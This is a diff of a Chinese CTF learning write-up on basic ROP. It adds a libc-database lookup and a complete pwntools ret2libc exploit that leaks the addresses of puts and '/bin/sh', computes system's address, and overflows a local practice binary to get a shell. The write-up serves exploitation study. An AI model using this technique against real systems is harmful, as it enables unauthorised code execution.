@@ -569,7 +569,7 @@ p.interactive()
 0x0804841d : pop ebx ; ret
 ```
 
-在使用本机libc和原来错误的wp的基础上，我勉勉强强搞出来一个还能跑的payload：
+在使用本机libc和原来可能错误的wp的基础上，我勉勉强强搞出来一个还能跑的payload：
 
 ```python
 from pwn import *
@@ -664,5 +664,38 @@ ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)
 
 那么我们先leak出`puts`的地址，然后找到`system`的got再执行就可以啦。
 
-尝试构造一下payload：
+找到了相对应的libc.so：
 
+```python
+➜  libc-database git:(master) ./find puts ca0                       master 
+ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)
+```
+
+构造payload：
+
+```python
+from pwn import *
+
+p = process('./ret2libc-nctu')
+
+p.recvuntil("The address of \"/bin/sh\" is ")
+
+binsh_addr = int(
+    p.recvuntil("The address of function \"puts\" is ", drop=True)[:-1], 16)
+
+puts_addr = p.recv()[:-1]
+
+libc = ELF('./libc6.so')
+
+basic_addr = int(puts_addr, 16) - libc.symbols['puts']
+system_addr = basic_addr + libc.symbols['system']
+
+payload = flat(['a' * 0x20, system_addr, 0xdeadbeef, binsh_addr])
+
+p.sendline(payload)
+p.interactive()
+```
+
+嘛终于不看wp构造成功了，虽然这道题也很简单啦。
+
+于是乎基本ROP就到这里啦，剩下的就看一下ctf-wiki就好了。我们接着跟着它的步伐，再做几道题吧~
